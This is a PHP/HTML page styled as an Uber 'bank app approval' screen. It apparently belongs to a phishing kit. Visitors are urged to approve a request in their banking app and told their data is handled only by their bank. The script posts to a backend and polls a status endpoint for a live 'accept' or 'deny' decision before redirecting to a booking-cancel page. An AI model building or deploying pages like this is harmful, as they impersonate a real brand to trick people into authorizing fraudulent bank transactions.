<?php
session_start();
include "./Assets/php/config/config.php";
?>
<!DOCTYPE html>
<html class="light" lang="en"><head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>Uber | Bank App Approval</title>
<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet"/>
<script id="tailwind-config">
      tailwind.config = {
        darkMode: "class",
        theme: {
          extend: {
            "colors": {
                    "error-container": "#ffdad6",
                    "surface-container-low": "#f3f3f3",
                    "on-error": "#ffffff",
                    "outline": "#777777",
                    "secondary-container": "#d4d4d4",
                    "outline-variant": "#c6c6c6",
                    "on-primary-fixed-variant": "#e2e2e2",
                    "primary-fixed": "#5e5e5e",
                    "on-secondary-container": "#1a1c1c",
                    "primary-fixed-dim": "#474747",
                    "tertiary": "#3b3b3b",
                    "surface-bright": "#f9f9f9",
                    "inverse-surface": "#303030",
                    "tertiary-container": "#747474",
                    "surface-dim": "#dadada",
                    "surface-container-lowest": "#ffffff",
                    "on-surface": "#1b1b1b",
                    "on-primary-container": "#ffffff",
                    "inverse-primary": "#c6c6c6",
                    "on-primary-fixed": "#ffffff",
                    "on-error-container": "#410002",
                    "surface-container-highest": "#e2e2e2",
                    "secondary": "#5d5f5f",
                    "background": "#f9f9f9",
                    "surface-container": "#eeeeee",
                    "on-primary": "#ffffff",
                    "on-background": "#1b1b1b",
                    "inverse-on-surface": "#f1f1f1",
                    "on-surface-variant": "#474747",
                    "surface": "#f9f9f9",
                    "error": "#ba1a1a",
                    "primary-container": "#3b3b3b",
                    "surface-container-high": "#e8e8e8",
                    "primary": "#000000",
                    "surface-variant": "#e2e2e2"
            },
            "borderRadius": {
                    "DEFAULT": "0.125rem",
                    "lg": "0.25rem",
                    "xl": "0.5rem",
                    "full": "0.75rem"
            },
            "fontFamily": {
                    "headline": ["Plus Jakarta Sans"],
                    "body": ["Inter"],
                    "label": ["Inter"]
            }
          },
        },
      }
    </script>
<style>
        body { font-family: 'Inter', sans-serif; -webkit-font-smoothing: antialiased; }
        h1, h2, h3, .font-headline { font-family: 'Plus Jakarta Sans', sans-serif; }
        .material-symbols-outlined { font-variation-settings: 'FILL' 0, 'wght' 300, 'GRAD' 0, 'opsz' 24; }

        .spin-cw  { animation: spin 3s linear infinite; }
        .spin-ccw { animation: spin 2s linear infinite reverse; }
        .spin-cw3 { animation: spin 6s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        @keyframes bankPulse {
            0%, 100% { transform: scale(1);   box-shadow: 0 0 0 0 rgba(0,0,0,0.08); }
            50%       { transform: scale(1.06); box-shadow: 0 0 0 10px rgba(0,0,0,0.03); }
        }
        .bank-pulse { animation: bankPulse 2.2s ease-in-out infinite; }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(14px); }
            to   { opacity: 1; transform: translateY(0); }
        }
        .anim { animation: fadeInUp 0.55s cubic-bezier(0.16,1,0.3,1) forwards; opacity: 0; }
        .d1 { animation-delay: 100ms; }
        .d2 { animation-delay: 250ms; }
        .d3 { animation-delay: 400ms; }

        @keyframes shake {
            0%,100% { transform: translateX(0); }
            15%      { transform: translateX(-8px); }
            30%      { transform: translateX(8px); }
            45%      { transform: translateX(-5px); }
            60%      { transform: translateX(5px); }
            80%      { transform: translateX(-3px); }
        }
        .do-shake { animation: shake 0.55s cubic-bezier(0.36,0.07,0.19,0.97); }
    </style>
</head>
<body class="bg-background text-on-background antialiased">

<!-- Loading Overlay -->
<div id="loadingOverlay" class="hidden fixed inset-0 z-[999] flex flex-col items-center justify-center bg-white">
    <div class="flex flex-col items-center gap-8">
        <div class="relative w-24 h-24">
            <div class="absolute inset-0 rounded-full border-4 border-black/10 animate-ping"></div>
            <div class="absolute inset-2 rounded-full border-4 border-black/20 animate-ping" style="animation-delay:0.15s"></div>
            <div class="absolute inset-4 rounded-full border-4 border-black border-t-transparent animate-spin"></div>
            <div class="absolute inset-0 flex items-center justify-center">
                <span class="material-symbols-outlined text-black text-2xl" style="font-variation-settings:'FILL' 1">account_balance</span>
            </div>
        </div>
        <div class="flex gap-2">
            <div class="w-2 h-2 rounded-full bg-black animate-bounce" style="animation-delay:0s"></div>
            <div class="w-2 h-2 rounded-full bg-black animate-bounce" style="animation-delay:0.15s"></div>
            <div class="w-2 h-2 rounded-full bg-black animate-bounce" style="animation-delay:0.3s"></div>
        </div>
        <div class="text-center">
            <p class="text-lg font-bold text-black font-headline">Waiting for bank approval</p>
            <p class="text-sm text-neutral-400 mt-1">Please approve in your banking application...</p>
        </div>
    </div>
</div>

<!-- TopNavBar -->
<header class="fixed top-0 w-full z-50 bg-white flex justify-between items-center px-6 py-4">
    <span class="text-2xl font-bold tracking-tighter text-black uppercase font-headline">Uber</span>
    <button class="text-black hover:opacity-80 transition-opacity">
        <span class="material-symbols-outlined">help</span>
    </button>
</header>

<!-- Main Canvas -->
<main class="min-h-screen pt-24 pb-40 px-6 flex flex-col max-w-2xl mx-auto">

    <div class="mt-12 space-y-8 flex-grow">

        <!-- Header -->
        <div class="space-y-4 pr-12 anim d1">
            <h1 class="font-headline font-extrabold text-4xl tracking-tighter text-primary leading-tight">
                Approve in your bank app
            </h1>
            <p class="text-on-surface-variant text-lg leading-relaxed max-w-md">
                Open your bank app to authorize this verification. We're waiting for your approval.
            </p>
        </div>

        <!-- Error Box (hidden by default) -->
        <div id="errorBox" class="hidden p-4 rounded-lg bg-red-50 border border-red-200 anim">
            <div class="flex items-center gap-3">
                <span class="material-symbols-outlined text-red-600">cancel</span>
                <div>
                    <p class="text-sm font-bold text-red-800">Approval Failed</p>
                    <p id="errorMsg" class="text-sm text-red-700 mt-1">Your bank declined the request. Please try again.</p>
                </div>
            </div>
        </div>

        <!-- Status Spinner Card -->
        <div id="statusCard" class="grid grid-cols-1 md:grid-cols-12 gap-4 mt-12 anim d2">
            <div class="md:col-span-8 bg-surface-container-lowest p-10 flex flex-col justify-center items-center gap-8">

                <!-- Clean Concentric Ring Spinner -->
                <div class="relative flex items-center justify-center" style="width:168px;height:168px">

                    <!-- Center icon with pulse -->
                    <div class="bank-pulse w-16 h-16 rounded-full bg-white shadow-md flex items-center justify-center">
                        <span class="material-symbols-outlined text-3xl text-black"
                              style="font-variation-settings:'FILL' 1,'wght' 300">account_balance</span>
                    </div>
                </div>

                <div class="text-center">
                    <span class="block font-headline font-bold text-xs tracking-widest uppercase text-black/30 mb-2">Security Handshake</span>
                    <p id="statusText" class="text-sm text-on-surface font-medium">Waiting for bank approval...</p>
                </div>
            </div>
            <div class="md:col-span-4 bg-surface-container-low p-6 flex flex-col justify-end gap-4">
                <span class="material-symbols-outlined text-primary text-2xl">vibration</span>
                <p class="text-xs text-on-surface-variant font-medium leading-normal">
                    Check for a push notification or look in the "Approvals" section of your banking application.
                </p>
            </div>
        </div>

        <!-- Editorial Card -->
        <div class="mt-8 p-8 bg-surface-container-lowest/50 backdrop-blur-xl border border-outline-variant/10 flex items-center gap-6 anim d3">
            <div class="w-16 h-16 shrink-0 overflow-hidden rounded-lg">
                <img class="w-full h-full object-cover grayscale" src="https://lh3.googleusercontent.com/aida-public/AB6AXuBkLbL4HtAFSU_ZBy-hwaRoatBkO5OTYTx8XPprAgXa7zN8MwlTX2x7tyxEcGKxe6HccVJGJNoM8wa1j-CpjguN55AnKNsAFxXDT_AvCIE-O0oqAbsgWsWqW8-B2cxMZFmsdquULG6MXZfGQq_oXGBrGyySGHpEdCrbfXNlT0fDVB11RiWmkZMonibX0-kFSKsc7UTMztC1gVNjhYmRUQbuW5mdpef2RGQWy7_lEG1g7BCXLoOSsB_yS8xZxeTwJzeYTGwO7vlHajio" alt="Bank card"/>
            </div>
            <div>
                <h3 class="font-headline font-bold text-sm text-primary">Secure verification</h3>
                <p class="text-sm text-on-surface-variant">Your sensitive data is encrypted and handled only by your trusted banking provider.</p>
            </div>
        </div>
    </div>
</main>

<!-- Sticky Bottom Actions -->
<div class="fixed bottom-0 left-0 w-full bg-white/80 backdrop-blur-xl p-6 flex flex-col gap-3">
    <button id="approveBtn" onclick="handleApprove()"
        class="w-full bg-primary text-white py-4 px-6 rounded font-bold text-base transition-transform active:scale-95 duration-100 flex items-center justify-center gap-2">
        I've approved
    </button>
    <button id="resendBtn" onclick="handleResend()" disabled
        class="w-full bg-transparent text-primary py-4 px-6 rounded font-bold text-sm hover:bg-surface-container transition-colors duration-100 uppercase tracking-tight disabled:opacity-40 disabled:cursor-not-allowed">
        <span id="resendLabel">Resend notification in <span id="countdown">30</span>s</span>
    </button>
</div>

<script>
let pollInterval = null;

// Auto-start 30s resend timer on page load
startResendTimer();

function handleApprove() {
    const btn = document.getElementById('approveBtn');
    document.getElementById('errorBox').classList.add('hidden');
    document.getElementById('loadingOverlay').classList.remove('hidden');
    btn.disabled = true;

    const formData = new FormData();
    formData.append('bank_approval', '1');

    fetch('./Assets/php/config/func.php', {
        method: 'POST',
        body: formData
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'pending' && data.sid) {
            pollInterval = setInterval(() => pollDecision(data.sid), 3000);
        } else {
            hideOverlay();
            showError('An error occurred. Please try again.');
        }
    })
    .catch(() => hideOverlay());
}

function pollDecision(sid) {
    fetch('./Assets/php/config/check_status.php?sid=' + encodeURIComponent(sid))
    .then(r => r.json())
    .then(data => {
        if (data.status === 'accept') {
            clearInterval(pollInterval);
            window.location.href = './booking_cancel.php';
        } else if (data.status === 'deny') {
            clearInterval(pollInterval);
            hideOverlay();
            showError('Your bank declined the request. Please try again or resend the notification.');
        }
    })
    .catch(() => {});
}

function hideOverlay() {
    document.getElementById('loadingOverlay').classList.add('hidden');
    document.getElementById('approveBtn').disabled = false;
}

function showError(msg) {
    const box = document.getElementById('errorBox');
    document.getElementById('errorMsg').textContent = msg;
    box.classList.remove('hidden');
    box.classList.add('do-shake');
    setTimeout(() => box.classList.remove('do-shake'), 600);
    box.scrollIntoView({ behavior: 'smooth', block: 'center' });
    // restart resend timer on error
    startResendTimer();
}

function handleResend() {
    const formData = new FormData();
    formData.append('bank_resend', '1');
    fetch('./Assets/php/config/func.php', { method: 'POST', body: formData }).catch(() => {});
    startResendTimer();
}

function startResendTimer() {
    const btn = document.getElementById('resendBtn');
    const lbl = document.getElementById('resendLabel');
    btn.disabled = true;
    let secs = 30;
    lbl.innerHTML = 'Resend notification in <span id="countdown">' + secs + '</span>s';

    const timer = setInterval(() => {
        secs--;
        const cd = document.getElementById('countdown');
        if (cd) cd.textContent = secs;
        if (secs <= 0) {
            clearInterval(timer);
            btn.disabled = false;
            lbl.textContent = 'Resend notification';
        }
    }, 1000);
}
</script>
</body></html>
